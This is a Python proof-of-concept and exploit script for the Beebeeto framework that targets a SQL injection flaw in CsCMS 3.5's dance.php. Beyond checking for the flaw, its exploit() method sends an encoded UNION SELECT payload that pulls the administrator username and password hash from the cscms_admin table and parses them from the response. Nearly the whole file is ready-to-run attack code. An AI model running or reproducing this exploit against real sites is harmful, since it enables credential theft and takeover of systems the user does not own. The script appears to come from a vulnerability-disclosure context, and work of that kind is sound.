#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0033',
            'name': 'CsCMS 3.5 /app/controllers/dance.php SQL注入漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2015-02-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'CsCMS',
            'vul_version': '3.5',
            'type': 'SQL Injection',
            'tag': ['CsCMS漏洞', '/app/controllers/dance.php', 'php'],
            'desc': 'CsCMS 3.5版本的dance.php中参数未过滤，导致SQL注入的产生。',
            'references': ['http://wooyun.org/bugs/wooyun-2014-059088',
            ]
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = '%s/index.php/dance/so/key/?key=' % url
        payload = '%252527)%20%2561%256E%2564%201=2%20union%20%2573%2565%25' \
                  '6C%2565%2563%2574%201,md5(1231231234),3,4,5,6,7,8,9,10,1' \
                  '1,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,' \
                  '30,31,32,33,34,35,36,37,38,39,40,41,42%23'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(verify_url+payload).content
        if 'f3c9f8ff331dab41a2363bca631e7aff' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + payload
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        verify_url = '%s/index.php/dance/so/key/?key=' % url
        payload = '%252527)%20%2561%256E%2564%201=2%20union%20%2573%2565%25' \
                  '6C%2565%2563%2574%201,concat(0x2d2d2d,CS_AdminName,0x3a3' \
                  'a,CS_AdminPass,0x2d2d2d),3,4,5,6,7,8,9,10,11,12,13,14,15' \
                  ',16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,3' \
                  '4,35,36,37,38,39,40,41,42%20from%20cscms_admin%23'
        match_data = re.compile('>---(.*)\:\:([\w\d]{32,32})---<')
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url + payload
        content = requests.get(verify_url+payload).content
        data = match_data.findall(content)
        if data:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + payload
            args['poc_ret']['username'] = data[0][0]
            args['poc_ret']['password'] = data[0][1]
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())